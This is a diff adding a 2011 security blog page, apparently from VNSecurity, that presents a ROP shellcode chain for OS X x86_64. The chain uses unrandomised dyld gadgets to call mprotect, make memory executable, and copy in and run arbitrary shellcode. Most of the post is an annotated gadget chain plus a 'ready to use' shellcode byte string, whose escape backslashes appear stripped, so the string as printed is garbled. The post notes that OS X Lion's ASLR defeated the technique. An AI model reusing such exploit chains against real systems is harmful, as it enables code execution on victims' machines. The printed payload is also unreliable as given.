@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width initial-scale=1">
+
+  <title>Yet another universal OSX x86_64 dyld ROP shellcode</title>
+  <meta name="description" content="This technique was killed by OSX Lion 10.7 with full ASLR. @pa_kt has posted an [Universal ROP shellcode for OS X x64][1] with detail steps and explanation. ...">
+  <link rel="stylesheet" href="/assets/bootstrap.css">
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://localhost:8000/research/2011/07/30/yet-another-universal-osx-x86_64-dyld-rop-shellcode.html">
+  <link rel="alternate" type="application/atom+xml" title="VNSecurity" href="http://localhost:8000/feed.xml" />
+  <script type="text/javascript" src='//ajax.googleapis.com/ajax/libs/webfont/1.4.7/webfont.js?ver=3.9.2'></script>
+  <script type="text/javascript" src="/assets/jquery.js"></script>
+  <script type="text/javascript" src="/assets/jquery.caroufredsel-6.0.4-packed.js"></script>
+  <script type="text/javascript">
+    // WebFont.load({
+    //     google: {
+    //         families: ['Source+Sans+Pro','Open+Sans::latin,vietnamese']
+    //     }
+    // });
+  </script>
+</head>
+
+    <body>
+        <div class="wrapper kopa-shadow">
+            <div class="row-fluid">
+                <header id="page-header">
+    <div class="clearfix" id="header-top">
+
+        <div class="kp-headline-wrapper clearfix">
+            <h6 class="kp-headline-title">Breaking news<span></span></h6>
+            <div class="kp-headline clearfix">
+                <dl class="ticker-1 clearfix">
+                    
+                    <dd>
+                        <a href="/headlines/2014/05/06/btalk-part-1.html">Phân tích ứng dụng Btalk trên Android &#8211; Phần một: Cơ chế xác thực người dùng</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/20/hoc-vien-sans-den-viet-nam.html">Học viện SANS đến Việt Nam 03/2012</a>
+                    </dd>
+                    
+                    <dd>
+                        <a href="/headlines/2011/12/16/hoi-thao-tet-2012.html">Hội thảo Tết 2012</a>
+                    </dd>
+                    
+                </dl><!--ticker-1-->
+            </div><!--kp-headline-->
+        </div><!--kp-headline-wrapper-->
+
+        <div class="social-search-box">
+
+        </div>
+        <!--social-search-box-->
+
+    </div>
+    <!--header-top-->
+
+    <div class="clearfix" id="header-middle">
+        <div id="logo-image">
+            <a href="http://vnsec-new.cloudapp.net/wp">
+                <img width="217" height="70" alt="VNSecurity Logo" src="/assets/logo.png">
+            </a>
+        </div>
+        <div class="top-banner">
+
+
+        </div>
+        <!--top-banner-->
+
+    </div>
+
+    <!--header-middle-->
+
+    <div id="header-bottom">
+        <nav id="main-nav">
+            <ul class="menu clearfix sf-js-enabled sf-arrows" id="main-menu">
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/">Home</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/headlines/">headlines</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/tutorials/">tutorials</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/research/">research</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/ctf-clgt-crew/">ctf - clgt crew</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                        <a href="/category/misc/">misc</a>
+                    </li>
+                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    |
+                    </li>
+                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/papers.html">Papers</a>
+                </li>
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                |
+                </li>                
+                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
+                    <a href="/tools.html">Tools</a>
+                </li>
+            </ul>
+        </nav>
+        <!--main-nav-->
+    </div>
+    <div>
+        
+    </div>
+    <!--header-bottom-->
+</header>
+                <div id="main-content">
+                    <div class="post type-post status-publish format-standard hentry category-tin-tuc tag-android tag-btalk tag-mobile entry-box clearfix">
+
+  <header class="post-header">
+    <h4 class="entry-title">Yet another universal OSX x86_64 dyld ROP shellcode</h4>
+    <p class="post-meta">Jul 30, 2011 • longld</p>
+  </header>
+
+  <article class="post-content">
+    <p>This technique was killed by OSX Lion 10.7 with full ASLR. @pa_kt has posted an <a href="http://gdtr.wordpress.com/2011/07/23/universal-rop-shellcode-for-os-x-x64/">Universal ROP shellcode for OS X x64</a> with detail steps and explanation. If you don’t have a chance to read above post, the basic ideas are:</p>
+
+<ul>
+  <li>Copy stubcode to a writable area (.data section)</li>
+  <li>Make that area RWX</li>
+  <li>Jump to RWX area and execute stubcode</li>
+  <li>Stubcode will transfer normal shellcode to RWX area and execute it</li>
+  <li>All the ROP gadgets are from dyld module which is not randomized</li>
+</ul>
+
+<p>In this post, we shows another OSX x86_64 dyld ROP shellcode which is more simple. We employ the same ideas with some minor differences in implementation:</p>
+
+<ul>
+  <li>Instead of using long gadgets with “leave”, we use direct, short gadgets from unintended code</li>
+  <li>Calling mprotect() via syscall</li>
+  <li>Short stubcode (7 bytes) using memcpy() to transfer payload</li>
+</ul>
+
+<p>Here is the ROP shellcode with explanation:</p>
+
+<pre class="brush: plain; title: ; notranslate" title=""># store [target], stubcode
+0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
+0xc353575e545a5b90 # =&gt; rsi = stubcode
+0x00007fff5fc24cdc # pop rdi
+0x00007fff5fc74f80 # =&gt; rdi
+0x00007fff5fc24d26 # mov [rdi+0x80] rsi; stubcode =&gt; [target]
+# load rdx, 0x7 (prot RWX)
+0x00007fff5fc24cdc # pop rdi
+0x00007fff5fc75001 # =&gt; rdi
+0x00007fff5fc1ddc0 # lea rax, [rdi-0x1]
+0x00007fff5fc219c3 # pop rbp ; add [rax] al ; add cl cl
+0x00007fff5fc75000 # =&gt; rbp
+0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
+0x0000000000000007 # =&gt; rsi
+0x00007fff5fc14149 # mov edx esi ; add [rax] al ; add [rbp+0x39] cl =&gt; rdx = 0x7
+# load rsi, 4096 (size)
+0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
+0x0000000000001000 # =&gt; rsi = 4096
+# load rax, mprotect_syscal
+0x00007fff5fc24cdc # pop rdi
+0x000000000200004b # =&gt; rdi
+0x00007fff5fc1ddc0 # lea rax, [rdi-0x1] =&gt; rax = 0x200004a (mprotect syscall)
+# load rdi, target
+0x00007fff5fc24cdc # pop rdi
+0x00007fff5fc75000 # =&gt; rdi = target
+# syscall
+0x00007fff5fc1c76d # mov r10, rcx; syscall  =&gt; mprotect(target, 4096, 7)
+0x00007fff5fc75000 # jump to target, execute stubcode
+# stubcode
+# 5B                pop rbx     # rbx -&gt; memcpy()
+# 5A                pop rdx     # rdx -&gt; size
+# 54                push rsp    # src -&gt; &amp;shellcode
+# 5E                pop rsi     # src -&gt; &amp;shellcode
+# 57                push rdi    # jump to target when return from memcpy()
+# 53                push rbx    # memcpy()
+# C3                ret         # execute memcpy(target, &amp;shellcode, size)
+0x00007fff5fc234f0 # &amp;memcpy()
+0x0000000000000200 # shellcode size = 512
+&lt;your shellcode here&gt;
+</pre>
+
+<p>You can verify those gadgets and find more here: <a href="http://goo.gl/p35vY">http://goo.gl/p35vY</a></p>
+
+<p>Ready to use shellcode:</p>
+
+<pre class="brush: plain; title: ; notranslate" title="">"xeexe7xc0x5fxffx7fx00x00x90x5bx5ax54x5ex57x53xc3"
+"xdcx4cxc2x5fxffx7fx00x00x80x4fxc7x5fxffx7fx00x00"
+"x26x4dxc2x5fxffx7fx00x00xdcx4cxc2x5fxffx7fx00x00"
+"x01x50xc7x5fxffx7fx00x00xc0xddxc1x5fxffx7fx00x00"
+"xc3x19xc2x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
+"xeexe7xc0x5fxffx7fx00x00x07x00x00x00x00x00x00x00"
+"x49x41xc1x5fxffx7fx00x00xeexe7xc0x5fxffx7fx00x00"
+"x00x10x00x00x00x00x00x00xdcx4cxc2x5fxffx7fx00x00"
+"x4bx00x00x02x00x00x00x00xc0xddxc1x5fxffx7fx00x00"
+"xdcx4cxc2x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
+"x6dxc7xc1x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
+"xf0x34xc2x5fxffx7fx00x00x00x02x00x00x00x00x00x00"
+</pre>
+
+  </article>
+
+</div>
+
+<hr/>
+<h2>Comments</h2>
+<div class="fb-comments" data-href="http://localhost:8000/research/2011/07/30/yet-another-universal-osx-x86_64-dyld-rop-shellcode.html" data-num-posts="4" data-width="706"></div>
+
+                </div>
+                <script type="text/javascript">
+jQuery(function() {
+    var _scroll = {
+        delay: 1000,
+        easing: 'linear',
+        items: 1,
+        duration: 0.07,
+        timeoutDuration: 0,
+        pauseOnHover: 'immediate'
+    };
+    jQuery('.ticker-1').carouFredSel({
+        width: 1000,
+        align: false,
+        items: {
+            width: 'variable',
+            height: 40,
+            visible: 1
+        },
+        scroll: _scroll
+    });
+
+    //  set carousels to be 100% wide
+    jQuery('.caroufredsel_wrapper').css('width', '100%');
+});
+</script>
+<script>
+  (function() {
+    var cx = '003844801333820630405:hlapfwpe2eq';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+        '//www.google.com/cse/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+<gcse:search></gcse:search>
+<footer class="site-footer">
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      
+    </div>
+
+  </div>
+
+</footer>
+
+            </div>
+        </div>
+        <script>(function(d, s, id) {
+          var js, fjs = d.getElementsByTagName(s)[0];
+          if (d.getElementById(id)) return;
+          js = d.createElement(s); js.id = id;
+          js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=671572696275219";
+          fjs.parentNode.insertBefore(js, fjs);
+        }(document, "script", "facebook-jssdk"));</script>
+    </body>
+</html>
